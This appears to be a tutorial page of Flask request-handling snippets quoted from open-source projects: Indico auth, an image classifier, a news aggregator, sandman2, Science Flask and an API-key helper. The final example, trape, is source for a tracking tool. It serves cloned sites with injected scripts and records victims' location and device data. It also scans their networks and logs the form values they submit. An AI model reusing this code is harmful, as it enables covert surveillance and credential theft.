        sync_providers = [p for p in self.identity_providers.itervalues() if p.settings.get('synced_fields')]
        if len(sync_providers) > 1:
            raise ValueError('There can only be one sync provider.')
        auth_providers = self.auth_providers.values()
        external_providers = [p for p in auth_providers if p.is_external]
        local_providers = [p for p in auth_providers if not p.is_external]
        if any(p.settings.get('default') for p in external_providers):
            raise ValueError('The default provider cannot be external')
        if all(p.is_external for p in auth_providers):
            return
        default_providers = [p for p in auth_providers if p.settings.get('default')]
        if len(default_providers) > 1:
            raise ValueError('There can only be one default auth provider')
        elif not default_providers:
            if len(local_providers) == 1:
                local_providers[0].settings['default'] = True
            else:
                raise ValueError('There is no default auth provider')

    def handle_auth_error(self, exc, redirect_to_login=False):
        if isinstance(exc, (NoSuchUser, InvalidCredentials)):
            logger.warning('Invalid credentials (ip=%s, provider=%s): %s',
~~                           request.remote_addr, exc.provider.name if exc.provider else None, exc)
        else:
            exc_str = str(exc)
            fn = logger.error
            if exc_str.startswith('mismatching_state:'):
                fn = logger.debug
            fn('Authentication via %s failed: %s (%r)', exc.provider.name if exc.provider else None, exc_str,
               exc.details)
        return super(IndicoMultipass, self).handle_auth_error(exc, redirect_to_login=redirect_to_login)


multipass = IndicoMultipass()



## ... source file continues with no further request examples...

```


## Example 19 from keras-flask-deploy-webapp
The
[keras-flask-deploy-webapp](https://github.com/mtobeiyf/keras-flask-deploy-webapp)
project combines the [Flask](/flask.html) [web framework](/web-frameworks.html)
with the [Keras deep learning library](https://keras.io/) to provide
an example image classifier that is easy to [deploy](/deployment.html).
The application can be quckly run in a [Docker](/docker.html) container
on your local development environment. The project is licensed under the
[GNU General Public License v3.0](https://github.com/mtobeiyf/keras-flask-deploy-webapp/blob/master/LICENSE).

[**keras-flask-deploy-webapp / app.py**](https://github.com/mtobeiyf/keras-flask-deploy-webapp/blob/master/././app.py)

```python
# app.py
import os
import sys

~~from flask import Flask, redirect, url_for, request, render_template, Response, jsonify, redirect
from werkzeug.utils import secure_filename
from gevent.pywsgi import WSGIServer

import tensorflow as tf
from tensorflow import keras

from tensorflow.keras.applications.imagenet_utils import preprocess_input, decode_predictions
from tensorflow.keras.models import load_model
from tensorflow.keras.preprocessing import image

import numpy as np
from util import base64_to_pil


app = Flask(__name__)



from tensorflow.keras.applications.mobilenet_v2 import MobileNetV2
model = MobileNetV2(weights='imagenet')

print('Model loaded. Check http://127.0.0.1:5000/')


MODEL_PATH = 'models/your_model.h5'



def model_predict(img, model):
    img = img.resize((224, 224))

    x = image.img_to_array(img)
    x = np.expand_dims(x, axis=0)

    x = preprocess_input(x, mode='tf')

    preds = model.predict(x)
    return preds


@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')


@app.route('/predict', methods=['GET', 'POST'])
def predict():
~~    if request.method == 'POST':
        img = base64_to_pil(request.json)


        preds = model_predict(img, model)

        pred_proba = "{:.3f}".format(np.amax(preds))    # Max probability
        pred_class = decode_predictions(preds, top=1)   # ImageNet Decode

        result = str(pred_class[0][0][1])               # Convert to string
        result = result.replace('_', ' ').capitalize()
        
        return jsonify(result=result, probability=pred_proba)

    return None


if __name__ == '__main__':

    http_server = WSGIServer(('0.0.0.0', 5000), app)
    http_server.serve_forever()



## ... source file continues with no further request examples...

```


## Example 20 from newspie
[NewsPie](https://github.com/skamieniarz/newspie) is a minimalistic news
aggregator created with [Flask](/flask.html) and the
[News API](https://newsapi.org/).

NewsPie is provided as open source under the
[MIT license](https://github.com/skamieniarz/newspie/blob/master/LICENSE).

[**newspie / news.py**](https://github.com/skamieniarz/newspie/blob/master/././news.py)

```python
# news.py
import configparser
import json
import logging
import os

import requests
import requests_cache
from dateutil import parser
~~from flask import (Flask, make_response, redirect, render_template, request,
                   url_for)

CONFIG = configparser.ConfigParser()
CONFIG.read('config.ini')
API_KEY = os.environ.get('NEWS_API_KEY')
TOP_HEADLINES = CONFIG['ENDPOINTS']['TOP_HEADLINES']
EVERYTHING = CONFIG['ENDPOINTS']['EVERYTHING']
PAGE_SIZE = int(CONFIG['VARIOUS']['PAGE_SIZE'])

CATEGORIES = ('general', 'sports', 'business', 'entertainment', 'health',
              'science', 'technology')
with open('data/countries.json') as json_file:
    COUNTRIES = json.load(json_file)

logging.basicConfig(level=logging.DEBUG)
requests_cache.install_cache(cache_name='news_cache',
                             backend='sqlite',
                             expire_after=300)

APP = Flask(__name__)


@APP.route('/', methods=['GET', 'POST'])
def root():
    return redirect(url_for('category', category='general', page=1))


@APP.errorhandler(404)
def page_not_found(error):
    return redirect(url_for('category', category='general', page=1))


@APP.route('/category/<string:category>', methods=['GET', 'POST'])
def category(category):
~~    page = request.args.get('page', default=1, type=int)
    if page < 1:
        return redirect(url_for('category', category=category, page=1))
~~    if request.method == 'POST' and category in CATEGORIES:
        return do_post(page, category)
    if category in CATEGORIES:
        params = {'page': page, 'category': category, 'pageSize': PAGE_SIZE}
        country = get_cookie('country')
        if country is not None:
            params.update({'country': country})
        response = requests.get(TOP_HEADLINES,
                                params=params,
                                headers={'Authorization': API_KEY})
        if response.status_code == 200:
            pages = count_pages(response.json())
            if page > pages:
                page = pages
                return redirect(url_for('category', category=category, page=page))
            articles = parse_articles(response.json())
            return render(articles, page, pages, country, category)
        elif response.status_code == 401:
            return render_template(CONFIG['VARIOUS']['401_TEMPLATE'])
    return redirect(url_for('category', category='general', page=page))


@APP.route('/search/<string:query>', methods=['GET', 'POST'])
def search(query):
~~    page = request.args.get('page', default=1, type=int)
    if page < 1:
        return redirect(url_for('search', query=query, page=1))
    params = {
        'qInTitle': query,
        'sortBy': 'relevancy',
        'page': page,
        'pageSize': PAGE_SIZE
    }
~~    if request.method == 'POST':
        return do_post(page, category='search', current_query=query)
    response = requests.get(EVERYTHING,
                            params=params,
                            headers={'Authorization': API_KEY})
    pages = count_pages(response.json())
    if page > pages:
        page = pages
        return redirect(url_for('search', query=query, page=page))
    articles = parse_articles(response.json())
    return render(articles,
                  page,
                  pages,
                  country=get_cookie('country'),
                  category='search')


def do_post(page, category='general', current_query=None):
~~    new_query = request.form.get('search_query')
~~    country = request.form.get('country')
~~    next_page = request.form.get('next_page')
~~    previous_page = request.form.get('previous_page')
    if new_query is not None and new_query != '':
        return redirect(url_for('search', query=new_query, page=1))
    if country is not None and country != get_cookie('country'):
        response = make_response(
            redirect(url_for('category', category=category, page=1)))
        response.set_cookie('country', country)
        return response
    if next_page is not None:
        page = int(next_page) + 1
    elif previous_page is not None:
        page = int(previous_page) - 1
    if category == 'search':
        return redirect(url_for('search', query=current_query, page=page))
    return redirect(url_for('category', category=category, page=page))


def parse_articles(response):
    parsed_articles = []
    if response.get('status') == 'ok':
        for article in response.get('articles'):
            parsed_articles.append({
                'published_at':
                    parser.isoparse(article['publishedAt']
                                   ).strftime('%Y-%m-%d %H:%M'),


## ... source file abbreviated to get to request examples ...


                    article['source']['name']
            })
    return parsed_articles


def count_pages(response):
    pages = 0
    if response.get('status') == 'ok':
        pages = (-(-response.get('totalResults', 0) // PAGE_SIZE))
    return pages


def render(articles, page, pages, country, category):
    pages = pages if pages <= 12 else 12
    return render_template(CONFIG['VARIOUS']['TEMPLATE'],
                           articles=articles,
                           categories=CATEGORIES,
                           category=category,
                           countries=COUNTRIES,
                           country=country,
                           page=page,
                           pages=pages)


def get_cookie(key):
~~    cookie_value = request.cookies.get(key)
    return cookie_value


if __name__ == '__main__':
    APP.run()



## ... source file continues with no further request examples...

```


## Example 21 from sandman2
[sandman2](https://github.com/jeffknupp/sandman2)
([project documentation](https://sandman2.readthedocs.io/en/latest/)
and
[PyPI package information](https://pypi.org/project/sandman2/))
is a code library for automatically generating
[RESTful APIs](/application-programming-interfaces.html) from
existing database schemas. This approach is handy for solving
straightforward situations where you want to put an abstraction
layer between one or more applications and your
[relational database](/databases.html) to prevent or reduce
direct database access.

The sandman2 project is provided under the
[Apache License 2.0](https://github.com/jeffknupp/sandman2/blob/master/LICENSE).

[**sandman2 / sandman2 / service.py**](https://github.com/jeffknupp/sandman2/blob/master/sandman2/./service.py)

```python
# service.py

~~from flask import request, make_response
import flask
from flask.views import MethodView
from sqlalchemy import asc, desc

from sandman2.exception import NotFoundException, BadRequestException
from sandman2.model import db
from sandman2.decorators import etag, validate_fields


def add_link_headers(response, links):
    link_string = '<{}>; rel=self'.format(links['self'])
    for link in links.values():
        link_string += ', <{}>; rel=related'.format(link)
    response.headers['Link'] = link_string
    return response


def jsonify(resource):

    response = flask.jsonify(resource.to_dict())
    response = add_link_headers(response, resource.links())
    return response


def is_valid_method(model, resource=None):
    validation_function_name = 'is_valid_{}'.format(
~~        request.method.lower())
    if hasattr(model, validation_function_name):
        return getattr(model, validation_function_name)(request, resource)

class Service(MethodView):


    __model__ = None

    __json_collection_name__ = 'resources'

    def delete(self, resource_id):
        resource = self._resource(resource_id)
        error_message = is_valid_method(self.__model__, resource)
        if error_message:
            raise BadRequestException(error_message)
        db.session().delete(resource)
        db.session().commit()
        return self._no_content_response()

    @etag
    def get(self, resource_id=None):
~~        if request.path.endswith('meta'):
            return self._meta()

        if resource_id is None:
            error_message = is_valid_method(self.__model__)
            if error_message:
                raise BadRequestException(error_message)

~~            if 'export' in request.args: 
                return self._export(self._all_resources())

            return flask.jsonify({
                self.__json_collection_name__: self._all_resources()
                })
        else:
            resource = self._resource(resource_id)
            error_message = is_valid_method(self.__model__, resource)
            if error_message:
                raise BadRequestException(error_message)
            return jsonify(resource)

    def patch(self, resource_id):
        resource = self._resource(resource_id)
        error_message = is_valid_method(self.__model__, resource)
        if error_message:
            raise BadRequestException(error_message)
~~        if not request.json:
            raise BadRequestException('No JSON data received')
        resource.update(request.json)
        db.session().merge(resource)
        db.session().commit()
        return jsonify(resource)

    @validate_fields
    def post(self):
        resource = self.__model__.query.filter_by(**request.json).first()
        if resource:
            error_message = is_valid_method(self.__model__, resource)
            if error_message:
                raise BadRequestException(error_message)
            return self._no_content_response()

        resource = self.__model__(**request.json)  # pylint: disable=not-callable
        error_message = is_valid_method(self.__model__, resource)
        if error_message:
            raise BadRequestException(error_message)
        db.session().add(resource)
        db.session().commit()
        return self._created_response(resource)

    def put(self, resource_id):


## ... source file abbreviated to get to request examples ...


                raise BadRequestException(error_message)
            resource.update(request.json)
            db.session().merge(resource)
            db.session().commit()
            return jsonify(resource)

        resource = self.__model__(**request.json)  # pylint: disable=not-callable
        error_message = is_valid_method(self.__model__, resource)
        if error_message:
            raise BadRequestException(error_message)
        db.session().add(resource)
        db.session().commit()
        return self._created_response(resource)

    def _meta(self):
        return flask.jsonify(self.__model__.description())

    def _resource(self, resource_id):
        resource = self.__model__.query.get(resource_id)
        if not resource:
            raise NotFoundException()
        return resource

    def _all_resources(self):
        queryset = self.__model__.query
~~        args = {k: v for (k, v) in request.args.items() if k not in ('page', 'export')}
        limit = None
        if args:
            filters = []
            order = []
            for key, value in args.items():
                if value.startswith('%'):
                    filters.append(getattr(self.__model__, key).like(str(value), escape='/'))
                elif key == 'sort':
                    direction = desc if value.startswith('-') else asc
                    order.append(direction(getattr(self.__model__, value.lstrip('-'))))
                elif key == 'limit':
                    limit = int(value)
                elif hasattr(self.__model__, key):
                    filters.append(getattr(self.__model__, key) == value)
                else:
                    raise BadRequestException('Invalid field [{}]'.format(key))
            queryset = queryset.filter(*filters).order_by(*order)
~~        if 'page' in request.args:
            resources = queryset.paginate(page=int(request.args['page']), per_page=limit).items
        else:
            queryset = queryset.limit(limit)
            resources = queryset.all()
        return [r.to_dict() for r in resources]

    def _export(self, collection):
        fieldnames = collection[0].keys()
        faux_csv = ','.join(fieldnames) + '\r\n'
        for resource in collection:
            faux_csv += ','.join((str(x) for x in resource.values())) + '\r\n'
        response = make_response(faux_csv)
        response.mimetype = 'text/csv'
        return response


    @staticmethod
    def _no_content_response():
        response = make_response()
        response.status_code = 204
        return response

    @staticmethod
    def _created_response(resource):


## ... source file continues with no further request examples...

```


## Example 22 from Science Flask
[Science Flask](https://github.com/danielhomola/science_flask)
is a [Flask](/flask.html)-powered web application for online
scientific research tools. The project was built as a template
for any scientist or groups of scientists to use when working
together without having to really understand how the application
is built. The application includes an academic registration
process (only valid academic email addresses can be used), an
admin panel, logging, and analysis forms.

[@danielhomola](https://github.com/danielhomola) is the
primary creator of Science Flask and the project is open
source under the
[GNU General Public License](https://github.com/danielhomola/science_flask/blob/master/LICENSE).

[**Science Flask / frontend / __init__.py**](https://github.com/danielhomola/science_flask/blob/master/./frontend/__init__.py)

```python
# __init__.py
import os
~~from flask import Flask, url_for, redirect, request, abort
from flask_mail import Mail
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager
from flask_security import Security, SQLAlchemyUserDatastore, signals, \
                           current_user
import flask_admin
from flask_admin.contrib import sqla
from flask_admin import helpers as admin_helpers
from flask_wtf.csrf import CSRFProtect
from celery import Celery


appdir = os.path.abspath(os.path.dirname(__file__))
ROOTDIR = os.path.abspath(os.path.join(appdir, os.pardir))
user_data_folder = os.path.join(ROOTDIR, 'userData')

app = Flask(__name__, instance_path=user_data_folder)

app.config.from_pyfile('config.py')

db = SQLAlchemy(app)

mail = Mail(app)



## ... source file abbreviated to get to request examples ...



class MyModelView(sqla.ModelView):

    def __init__(self, model, session, name=None, category=None, endpoint=None,
                 url=None, **kwargs):
        for k, v in kwargs.items():
            setattr(self, k, v)

        super(MyModelView, self).__init__(model, session, name=name,
                                          category=category, endpoint=endpoint,
                                          url=url)

    def is_accessible(self):
        if not current_user.is_active or not current_user.is_authenticated:
            return False

        if current_user.has_role('superuser'):
            return True
        return False

    def _handle_view(self, name, **kwargs):
        if not self.is_accessible():
            if current_user.is_authenticated:
                abort(403)
            else:
~~                return redirect(url_for('security.login', next=request.url))

admin = flask_admin.Admin(
    app,
    'Admin panel',
    base_template='admin_base.html',
    template_mode='bootstrap3',
)

from .models import Studies, Analyses
admin.add_view(MyModelView(Role, db.session))
cols = [c for c in User.__table__.columns]
admin.add_view(MyModelView(User, db.session, column_list=cols))
cols = [c for c in Studies.__table__.columns]
admin.add_view(MyModelView(Studies, db.session, column_list=cols))
cols = [c for c in Analyses.__table__.columns]
admin.add_view(MyModelView(Analyses, db.session, column_list=cols))

@security.context_processor
def security_context_processor():
    return dict(
        admin_base_template=admin.base_template,
        admin_view=admin.index_view,
        h=admin_helpers,
        get_url=url_for


## ... source file continues with no further request examples...

```


## Example 23 from tedivms-flask
[tedivm's flask starter app](https://github.com/tedivm/tedivms-flask) is a
base of [Flask](/flask.html) code and related projects such as
[Celery](/celery.html) which provides a template to start your own
Flask web app. The project comes baked with an admin panel,
[API authentication and authorization](/application-programming-interfaces.html),
[SQLAlchemy](/sqlalchemy.html) and many other common libraries that are
often used with Flask.

The project's code is provided as open source under the
[BSD 2-Clause "Simplified" license](https://github.com/tedivm/tedivms-flask/blob/master/LICENSE.txt).

[**tedivms-flask / app / utils / api.py**](https://github.com/tedivm/tedivms-flask/blob/master/app/utils/api.py)

```python
# api.py
from app.models import user_models as users
from functools import wraps
~~from flask import request, abort, current_app


def is_authorized_api_user(roles=False):
~~    if 'API_ID' not in request.headers:
        return False
~~    if 'API_KEY' not in request.headers:
        return False
~~    api_key = users.ApiKey.query.filter(users.ApiKey.id==request.headers['API_ID']).first()
    if not api_key:
        return False
    if not current_app.user_manager.verify_password(request.headers['API_KEY'], api_key.hash):
        return False
    if not roles:
        return True
    if api_key.user.has_role('admin'):
        return True
    for role in roles:
        if api_key.user.has_role(role):
            return True
    return False


def roles_accepted_api(*role_names):
    def wrapper(view_function):
        @wraps(view_function)
        def decorated_view_function(*args, **kwargs):
            if not is_authorized_api_user(role_names):
                return abort(403)
            return view_function(*args, **kwargs)
        return decorated_view_function
    return wrapper



## ... source file continues with no further request examples...

```


## Example 24 from trape
[trape](https://github.com/jofpin/trape) is a research tool for tracking
people's activities that are logged digitally. The tool uses
[Flask](/flask.html) to create a web front end to view aggregated data
on an individual the application is set to track. The source code is
provided as open source under the MIT license, according to the
[README](https://github.com/jofpin/trape/blob/master/README.md).

[**trape / core / user.py**](https://github.com/jofpin/trape/blob/master/./core/user.py)

```python
# user.py
import time
from core.dependence import urllib2
~~from flask import Flask, render_template, session, request, json, Response
from core.user_objects import *
import core.stats
from core.utils import utils
from core.db import Database
import os
import sys
import platform
from multiprocessing import Process

trape = core.stats.trape
app = core.stats.app

db = Database()

class victim_server(object):
    @app.route("/" + trape.victim_path)
    def homeVictim():
        opener = urllib2.build_opener()
        headers = victim_headers(request.user_agent)
        opener.addheaders = headers
        if (trape.type_lure == 'local'):
            html = assignScripts(victim_inject_code(render_template("/" + trape.url_to_clone), 'payload', '/', trape.gmaps, trape.ipinfo))
        else:
            html = assignScripts(victim_inject_code(opener.open(trape.url_to_clone).read(), 'payload', trape.url_to_clone, trape.gmaps, trape.ipinfo))
        return html

    @app.route("/register", methods=["POST"])
    def register():
~~        vId = request.form['vId']
        if vId == '':
          vId = utils.generateToken(5)
        
~~        victimConnect = victim(vId, request.environ['REMOTE_ADDR'], request.user_agent.platform, request.user_agent.browser, request.user_agent.version,  utils.portScanner(request.environ['REMOTE_ADDR']), request.form['cpu'], time.strftime("%Y-%m-%d - %H:%M:%S"))
~~        victimGeo = victim_geo(vId, request.form['city'], request.form['country_code2'], request.form['country_name'], request.form['ip'], request.form['latitude'], request.form['longitude'], request.form['isp'], request.form['country_code3'], request.form['state_prov'], '', request.form['zipcode'], request.form['organization'], str(request.user_agent), '')
        
~~        vRA = request.environ['REMOTE_ADDR']

        gHA = Process(target=getHostsAlive, args=(vRA, vId,))
        gHA.start()

        utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " A " + utils.Color['whiteBold'] + "user" + utils.Color['white'] + " has been connected from " + utils.Color['blue'] + victimGeo.ip + utils.Color['white'] + ' with the following identifier: ' + utils.Color['green'] + vId + utils.Color['white'])
        cant = int(db.sentences_victim('count_times', vId, 3, 0))

        db.sentences_victim('insert_click', [vId, trape.url_to_clone, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
        db.sentences_victim('delete_networks', [vId], 2)

        if cant > 0:
            utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " " + "It\'s the " + str(cant + 1) + " time for " + utils.Color['green'] + str(vId) + utils.Color['white'] + "@" + utils.Color['blue'] + victimGeo.ip + utils.Color['white'])
            db.sentences_victim('update_victim', [victimConnect, vId, time.time()], 2)
            db.sentences_victim('update_victim_geo', [victimGeo, vId], 2)
        else:
            utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " " + "It\'s the first time for " + utils.Color['green'] + str(vId) + utils.Color['white'] + "@" + utils.Color['blue'] + victimGeo.ip + utils.Color['white'])
            db.sentences_victim('insert_victim', [victimConnect, vId, time.time()], 2)
            db.sentences_victim('insert_victim_data', [vId], 2)
            db.sentences_victim('insert_victim_battery', [vId], 2)
            db.sentences_victim('insert_victim_geo', [victimGeo, vId], 2)
        return json.dumps({'status' : 'OK', 'vId' : vId})

    @app.route("/nr", methods=["POST"])
    def networkRegister():
~~        vId = request.form['vId']
~~        vIp = request.form['ip']
~~        vnetwork = request.form['red']
        if vId == '':
          vId = utils.generateToken(5)

        cant = int(db.sentences_victim('count_victim_network', [vId, vnetwork], 3, 0))

        if cant > 0:
            db.sentences_victim('update_network', [vId, vnetwork, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
        else:
~~            db.sentences_victim('insert_networks', [vId, vIp, request.environ['REMOTE_ADDR'], vnetwork, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
            utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "+" + utils.Color['white'] + "]" + utils.Color['whiteBold'] + " " + vnetwork + utils.Color['white'] + " session detected from " + utils.Color['blue'] + vIp + utils.Color['white'] + ' ' + "with ID: " + utils.Color['green'] + vId + utils.Color['white'])
        return json.dumps({'status' : 'OK', 'vId' : vId})

    @app.route("/lr", methods=["POST"])
    def locationRegister():
~~        vId = request.form['vId']
~~        lat = request.form['lat']
~~        lon = request.form['lon']

        db.sentences_victim('location_victim', [vId, lat, lon], 2)
        return json.dumps({'status' : 'OK', 'vId' : vId})

    @app.route("/lc", methods=["POST"])
    def connectionRegister():
~~        vId = request.form['vId']
~~        con = request.form['con']
~~        host = request.form['host']

        db.sentences_victim('connection_victim', [vId, con, host], 2)
        return json.dumps({'status' : 'OK', 'vId' : vId})

    @app.route("/bs", methods=["POST"])
    def batteryStatusRegister():
~~        vId = request.form['id']
~~        b_data = request.form['d']
~~        b_type = request.form['t']
        
        db.sentences_victim('update_battery', [vId, b_data, b_type], 2)
        return json.dumps({'status' : 'OK', 'vId' : vId})

    @app.route("/nm", methods=["POST"])
    def navigationMode():
~~        vId = request.form['id']
~~        b_data = request.form['d']
~~        b_data_2 = request.form['dn']
        
        db.sentences_victim('update_navigationmode', [vId, b_data, b_data_2], 2)
        return json.dumps({'status' : 'OK', 'vId' : vId})

    @app.route("/rv")
    def redirectVictim():
~~        url = request.args.get('url')
        if url[0:4] != 'http':
            url = 'http://' + url
        opener = urllib2.build_opener()
        headers = victim_headers(request.user_agent)
        opener.addheaders = headers
        html = assignScripts(victim_inject_code(opener.open(url).read(), 'vscript', url, trape.gmaps, trape.ipinfo))
        return html

    @app.route("/regv", methods=["POST"])
    def registerRequest():
~~        vrequest = victim_request(request.form['vId'], request.form['site'], request.form['fid'], request.form['name'], request.form['value'], request.form['sId'])
        db.sentences_victim('insert_requests', [vrequest, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
        utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "=" + utils.Color['white'] + "]" + " " + 'Receiving data from: ' + utils.Color['green'] + vrequest.id + utils.Color['white']  + ' ' + 'on' + ' ' + utils.Color['blue'] + vrequest.site + utils.Color['white'] + '\t\n' + vrequest.fid + '\t' + vrequest.name + ':\t' + vrequest.value)
        return json.dumps({'status' : 'OK', 'vId' : vrequest.id})

    @app.route("/tping", methods=["POST"])
    def receivePiregisterGPUng():
~~        vrequest = request.form['id']
        db.sentences_victim('report_online', [vrequest], 2)
        db.sentences_victim('update_lastping', [vrequest, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
        return json.dumps({'status' : 'OK', 'vId' : vrequest})

    @app.route("/cIp", methods=["POST"])
    def changeLocalIp():
~~        vrequest = request.form['id']
~~        vIp = request.form['ip']
        db.sentences_victim('update_localIp', [vrequest, vIp], 2)
        return json.dumps({'status' : 'OK', 'vId' : vrequest})

    @app.route("/gGpu", methods=["POST"])
    def setGpuInfo():
~~        vId = request.form['vId']
~~        vData = request.form['data']
        db.sentences_victim('update_gpu', [vId, vData], 2)
        return json.dumps({'status' : 'OK', 'vId' : vId})
    

def getHostsAlive(ip, vId):
    hDB = Database()
    try:
        hDB.sentences_victim('delete_hostalive', vId, 2)
        split_ip = ip.split('.')
        net = split_ip[0] + '.' + split_ip[1] + '.' + split_ip[2] + '.'
        if ip != '127.0.0.1':
            if (platform.system()=='Windows'):
                ping = 'ping -n 1 -w 5'
            else:
                ping = 'ping -c 1 -t 3'
            for sub_net in range(1, 255):
                address = net + str(sub_net)
                response = os.popen(ping + ' ' + address)
                for line in response.readlines():
                    if ('time=' in line.lower()):
                        lPos = line.find('time=')
                        tmpLine = line[lPos+5:lPos+15]
                        lPos = tmpLine.find('ms')
                        tmpLine = tmpLine[0:lPos+2]


## ... source file continues with no further request examples...

```

